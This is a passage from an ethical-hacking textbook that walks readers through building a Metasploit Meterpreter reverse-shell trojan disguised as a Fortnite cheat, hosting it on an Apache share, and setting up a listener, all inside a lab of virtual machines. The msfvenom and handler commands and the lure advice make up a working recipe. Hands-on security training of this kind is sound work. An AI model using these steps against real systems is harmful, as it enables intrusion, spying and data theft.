    # Introduction


    In this chapter, you’ll safely create a virus on your Kali VM and infect your
    Windows VM across your virtual network. Then you’ll take control of the Windows
    VM from your Kali workstation and steal data, keystrokes, webcam video, and more—just
    like an attacker would. You’ll do this responsibly so the malware doesn’t escape
    your virtual environment. Along the way, you’ll learn to protect yourself from
    most malware on the internet.


    To perform our hack, we’ll use one of Kali’s most famous tools, `Metasploit`.
    The `Metasploit Framework` is an open source penetration-testing toolkit maintained
    by computer security company Rapid7. It’s called a framework because it’s a complete
    software platform for developing, testing, and executing exploits. An `exploit`
    is an attack designed to take advantage of a vulnerability in a computer system.


    `Metasploit` has been called the hacker’s Swiss Army knife because it comes with
    so many useful tools built in. In fact, `Metasploit` contains a whopping 2,000
    exploits and counting, including ones that target Windows, macOS, Linux, Microsoft
    Office, Adobe products, most browsers, iOS, Android, and more.


    ## Building Your Own Virus


    We’ll start by building malware on your Kali VM to take over your Windows VM across
    the PublicNAT network we created in Chapter 3. Specifically, we’ll create a `trojan`,
    a type of malware that looks harmless but can give an attacker control of your
    computer. Trojans are sometimes called `remote access trojans` (`RATs`) because
    they allow an attacker to control the target computer through the internet from
    anywhere in the world—no physical access needed.


    Trojans are typically disguised as files someone would be tempted to download
    and run, such as a pirated copy of the latest hit song or movie or a cheat for
    a popular video game. As an example, we’ll call our trojan `Fortnite_cheat_mode.exe`.
    Log in to your Kali VM and let’s create some malware! You might be surprised by
    how easy it is.


    1. In your Kali VM, click the Kali icon in the top left and go to **08 - Exploitation
    Tools**▶**Metasploit Framework**. If you’re asked for the sudo password, enter
    `kali`. The `Metasploit Framework` console (`msfconsole`) will start up, typically
    with a fun piece of ASCII text art at the top, like the one shown in [Figure 6-1](#c06.xhtml#figure6-1).


    2. You should see a command prompt labeled `msf6 >`, short for “Metasploit Framework,
    version 6.” Enter `ip addr` to check your Kali VM’s IP address and make sure it’s
    connected to the PublicNAT network:


    ```

    msf6 > ip addr

    ```


    ![Figure 6-1: Startup information for the Metasploit Framework console, with the
    Metasploit msf6 > command prompt at the bottom left](image_fi/502000c06/f06001.png)


    Figure 6-1: Startup information for the Metasploit Framework console, with the
    Metasploit `msf6 >` command prompt at the bottom left


    3. Look for a line under the section `eth0:` that begins with `inet` followed
    by an IP address:


    ```

    2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP
    group default qlen 1000 link/ether 08:00:27:23:ff:90 brd ff:ff:ff:ff:ff:ff inet
    10.0.9.x/24 brd 10.0.9.255 scope global noprefixroute eth0 1

    ```


    As long as the address begins with `10.0.9` 1, you’re on the PublicNAT network
    you created in Chapter 3 and ready to go. Take note of the IP address; you’ll
    need to enter it as part of several commands. If you don’t see `10.0.9.x` as your
    IP address, go back to Chapter 3, page 26, to create the PublicNAT network, or
    page 27 to connect your Kali VM to it correctly.


    4. Enter the following two lines, replacing the `x` in the IP address with the
    number you just looked up:


    ```

    msf6 > msfvenom  -p  windows/meterpreter/reverse_tcp  \ > LHOST=10.0.9.x  -f  exe  -o  ~/Desktop/Fortnite_cheat_mode.exe

    ```


    5. You should now see a file called `Fortnite_cheat_mode.exe` on your desktop,
    as shown in [Figure 6-2](#c06.xhtml#figure6-2). If you don’t see the file, open
    File Explorer and go to `/home/kali/Desktop/` to find it.


    ![Figure 6-2: The msfvenom tool creates a trojan named Fortnite_cheat_mode.exe
    and places it on the desktop (lower-left).](image_fi/502000c06/f06002.png)


    Figure 6-2: The `msfvenom` tool creates a trojan named `Fortnite_cheat_mode.exe`
    and places it on the desktop (lower-left).


    You’ve now created your first trojan—nicely done! All it took was the two lines
    we entered at the `msf6 >` command prompt in step 4. Actually, it was just one
    long command, but the backslash (`\`) at the end of the first line let us continue
    the command onto the second line.


    So what did the command actually do? It told `Metasploit`’s `msfvenom` tool to
    create a piece of malware containing the `Meterpreter` shell, an interface that
    will give us command line (shell) control over the Windows VM from Kali. We told
    the `Meterpreter` shell where to receive commands from by typing `LHOST=` followed
    by the Kali VM’s IP address. The `-f` `exe` option told `msfvenom` that the format
    (`-f`) of the output should be a Windows executable (`exe`) program file. The
    `-o` option told `msfvenom` the name and location of the file to output: a file
    called `Fortnite_cheat_mode.exe` saved to the desktop (`~/Desktop/`).


    ### Sharing the Malware


    Now that we have a trojan Windows executable file, we need to get it onto your
    Windows VM. Often an attacker would try sending the trojan by email, but a lot
    of email programs scan attachments for malware, plus you wouldn’t want to send
    a trojan through your personal email account anyway. Instead, we’ll create a shared
    folder that the Windows user can surf to through their web browser.


    1. Enter this command into the `msfconsole` window to create a folder called `share`
    at the default location for a shared web folder on most Linux computers:


    ```

    msf6 > sudo mkdir /var/www/html/share

    ```


    2. Copy the trojan into the new folder:


    ```

    msf6 > sudo cp ~/Desktop/Fortnite_cheat_mode.exe /var/www/html/share

    ```


    3. Start the `Apache` web server application so the folder will be accessible
    through the web:


    ```

    msf6 > sudo service apache2 start

    ```


    4. To confirm that the trojan is now available for download, open the web browser
    in your Kali VM and go to `http://<10.0.9.x>/share`, replacing `<10.0.9.x>` with
    your Kali VM’s IP address. You’ll see a web page like the one shown in [Figure
    6-3](#c06.xhtml#figure6-3).


    ![Figure 6-3: Thanks to Kali’s Apache web server, our trojan malware is now available
    on the (virtual) web!](image_fi/502000c06/f06003.png)


    Figure 6-3: Thanks to Kali’s Apache web server, our trojan malware is now available
    on the (virtual) web!


    ### Listening for the Trojan to Phone Home


    We now need to prepare `Metasploit` to receive incoming connections from infected
    Windows machines (we sometimes call this `phoning home`). An incoming connection
    will let us send malicious commands to control a machine remotely. Typically,
    an attacker would send a virus email attachment to thousands of potential victims,
    waiting to see which ones open the attachment and get infected. In our case, we’ll
    infect only the one Windows VM. However, by following these steps, we could receive
    connections for controlling several infected computers at once just as easily.


    1. Enter this command at the `msf6 >` prompt to tell `Metasploit` to handle, or
    accept, multiple incoming connections from infected computers:


    ```

    msf6 > use exploit/multi/handler

    ```


    The `msfconsole` prompt will change to let us know the `multi/handler` exploit
    is active.


    2. Now tell `Metasploit` that the Trojan’s `payload`—that is, the malicious program
    we’re delivering—is a `Meterpreter` shell:


    ```

    msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp

    ```


    The `msfconsole` will respond with `PAYLOAD => windows/meterpreter/reverse_tcp`
    to let us know the Meterpreter payload has been selected.

